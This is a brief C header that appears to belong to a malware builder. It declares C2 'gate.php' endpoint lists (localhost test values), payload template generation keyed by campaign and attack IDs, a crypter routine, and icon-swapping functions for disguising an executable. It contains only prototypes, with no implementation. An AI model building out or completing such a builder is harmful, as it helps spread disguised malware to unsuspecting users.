#define MAX_GATES				1024
#define GATE_DELIMITER			"|"
#define WRAPPER_GATE_WAIT		2000

#define GATE_LIST_TEST			"http://127.0.0.1:80/gate.php|http://localhost:81/gate.php"

BOOL generate_template(	__in	LPCSTR	gate_list,
						__in	PDWORD	skeleton,
						__in	UINT	skeleton_size,
						__in	UINT	campaign_id,
						__in	UINT	attack_id,
						__out	PDWORD	*pe,
						__out	PUINT	size);

BOOL crypt_template(LPCSTR template_path, LPCSTR crypted_path);

BOOL install_template_resource(LPCSTR template_path, LPCSTR original_file_path);

VOID extract_ico(PDWORD icon_file, UINT icon_file_size, PICONDIR icon_directory, PICONIMAGE icon_images[MAX_ICONS]);
VOID install_ico_pe(LPCSTR file_name, PICONDIR icon_directory, PICONIMAGE icon_images[MAX_ICONS]);